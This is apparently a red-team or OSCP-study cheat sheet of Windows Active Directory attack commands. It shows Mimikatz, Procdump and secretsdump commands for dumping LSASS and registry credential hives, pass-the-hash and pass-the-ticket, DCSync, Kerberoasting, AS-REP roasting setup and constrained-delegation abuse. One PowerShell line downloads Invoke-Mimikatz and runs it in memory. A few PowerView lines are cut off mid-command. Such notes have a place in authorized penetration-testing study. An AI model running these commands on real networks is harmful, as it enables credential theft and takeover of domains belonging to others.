# Mimikatz/PowerView/Rubeus

# Procdump

```bash
# windows
.\procdump64.exe -accepteula -ma lsass.exe lsass.dmp

# linux
pypykatz lsa minidump lsass.dmp -o ../creds/lsass-vuln0.dmp.txt
```

# Invoke-Mimikatz Commands

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

# Mimikatz one-liner

This is good if the interactive mode is glitching out

```bash
.\mimikatz_x64.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit" > mimikatz_dump.txt
```

# Secretsdump.py

You can use these commands to save the sam, security, and system to extract the hashes offline

```bash
# dump sam, security and system files to get the hash
reg.exe save hklm\sam c:\Users\alice\Documents\sam.save
reg.exe save hklm\security c:\Users\alice\Documents\security.save
reg.exe save hklm\system c:\Users\alice\Documents\system.save
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```

### Cracking NTLM hashes to get plaintext passwords

As a side note, you can crack LM hashes to get the passwords.

```bash
hashcat -m 1000 --force -a 0 08df3c73ded940e1f2bcf5eea4b8dbf6 ./passwords.txt
```

# Mimikatz Basic commands

These were taken from S1ckB0y1337 [here](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#mimikatz)

```jsx
#The commands are in cobalt strike format!

#Dump LSASS:
mimikatz privilege::debug
mimikatz token::elevate
mimikatz sekurlsa::logonpasswords

#(Over) Pass The Hash
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>

#List all available kerberos tickets in memory
mimikatz sekurlsa::tickets

#Dump local Terminal Services credentials
mimikatz sekurlsa::tspkg

#Dump and save LSASS in a file
mimikatz sekurlsa::minidump c:\temp\lsass.dmp

#List cached MasterKeys
mimikatz sekurlsa::dpapi

#List local Kerberos AES Keys
mimikatz sekurlsa::ekeys

#Dump SAM Database
mimikatz lsadump::sam

#Dump SECRETS Database
mimikatz lsadump::secrets

#Inject and dump the Domain Controler's Credentials
mimikatz privilege::debug
mimikatz token::elevate
mimikatz lsadump::lsa /inject

#Dump the Domain's Credentials without touching DC's LSASS and also remotely
mimikatz lsadump::dcsync /domain:<DomainFQDN> /all

#List and Dump local kerberos credentials
mimikatz kerberos::list /dump

#Pass The Ticket
mimikatz kerberos::ptt <PathToKirbiFile>

#List TS/RDP sessions
mimikatz ts::sessions

#List Vault credentials
mimikatz vault::list
```

# PowerView

Here is a Cheatsheet of powerview commandlets to use

Domain info

```jsx
#Basic Domain Information
Get-NetDomain

#User Information
Get-NetUser
Get-NetUser | select samaccountname, description, logoncount
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount
Get-NetUser -LDAPFilter '(sidHistory=*)'
Get-NetUser -PreauthNotRequired
Get-NetUser -SPN

#Groups Information
Get-NetGroup | select samaccountname,description
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=EGOTISTICAL-BANK,DC=local' | %{ $_.SecurityIdentifier } | Convert-SidToName

#Computers Information
Get-NetComputer | select samaccountname, operatingsystem
Get-NetComputer -Unconstrained | select samaccountname 
Get-NetComputer -TrustedToAuth | select samaccountname
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*
```

Other Enum

```jsx
Get-NetFileServer #Search file servers. Lot of users use to be logged in this kind of servers
Find-DomainShare -CheckShareAccess #Search readable shares
Find-InterestingDomainShareFile #Find interesting files, can use filters

#GPO
Get-NetGPO #Get all policies with details
Get-NetGPO | select displayname #Get the names of the policies
Get-NetGPO -ComputerName <servername> #Get the policy applied in a computer
gpresult /V #Get current policy

# Enumerate permissions for GPOs where users with RIDs of > -1000 have some kind of modification/control rights
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}

Get-ObjectAcl -SamAccountName <username> -ResolveGUIDs #Get ACLs of an object (permissions of other objects over the indicated one)
Get-PathAcl -Path "\\dc.mydomain.local\sysvol" #Get permissions of a file
Find-InterestingDomainAcl -ResolveGUIDs #Find intresting ACEs (Interesting permisions of "unexpected objects" (RID>1000 and modify permissions) over other objects
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"} #Check if any of the interesting permissions founds is realated to a username/group
Get-NetGroupMember -GroupName "Administrators" -Recurse | ?{$_.IsGroup -match "false"} | %{Get-ObjectACL -SamAccountName $_.MemberName -ResolveGUIDs} | select ObjectDN, IdentityReference, ActiveDirectoryRights #Get special rights over All administrators in domain

# KERBEROASTING
Invoke-Kerberoast -OutputFormat john | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```

Domain trust

```jsx
Get-NetDomainTrust #Get all domain trusts (parent, children and external)
Get-NetForestDomain | Get-NetDomainTrust #Enumerate all the trusts of all the domains found
Get-DomainTrustMapping #Enumerate also all the trusts
Get-ForestGlobalCatalog #Get info of current forest (no external)
Get-ForestGlobalCatalog -Forest external.domain #Get info about the external forest (if possible)
Get-DomainTrust -SearchBase "GC://$($ENV:USERDNSDOMAIN)" 
Get-NetForestTrust #Get forest trusts (it must be between 2 roots, trust between a child and a root is just an external trust)
Get-DomainForeingUser #Get users with privileges in other domains inside the forest
Get-DomainForeignGroupMember #Get groups with privileges in other domains inside the forest
```

### Privilege escalation (PE)

Asrep roast

```jsx
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
Disable Kerberos Preauth:
Set-DomainObject -Identity <UserAccount> -XOR @{useraccountcontrol=4194304} -Verbose
Check if the value changed:
Get-DomainUser -PreauthNotRequired -Verbose
```

Constrained delegation (learn more about exploitation [here](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#unconstrained-delegation))

```jsx
#Enumerate Users and Computers with constrained delegation
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

#If we have a user that has Constrained delegation, we ask for a valid tgt of this user using kekeo
tgt::ask /user:<UserName> /domain:<Domain's FQDN> /rc4:<hashedPasswordOfTheUser>

#Then using the TGT we have ask a TGS for a Service this user has Access to through constrained delegation
tgs::s4u /tgt:<PathToTGT> /user:<UserToImpersonate>@<Domain's FQDN> /service:<Service's SPN>

#Finally use mimikatz to ptt the TGS
Invoke-Mimikatz -Command '"kerberos::ptt <PathToTGS>"'
```

## PowerView Commands

Here is a really good list of powerview commands for enumeration

[OSCP Blog Series - OSCP Cheatsheet - PowerView Commands | Hackers Interview Media](https://hackersinterview.com/oscp/oscp-cheatsheet-powerview-commands/)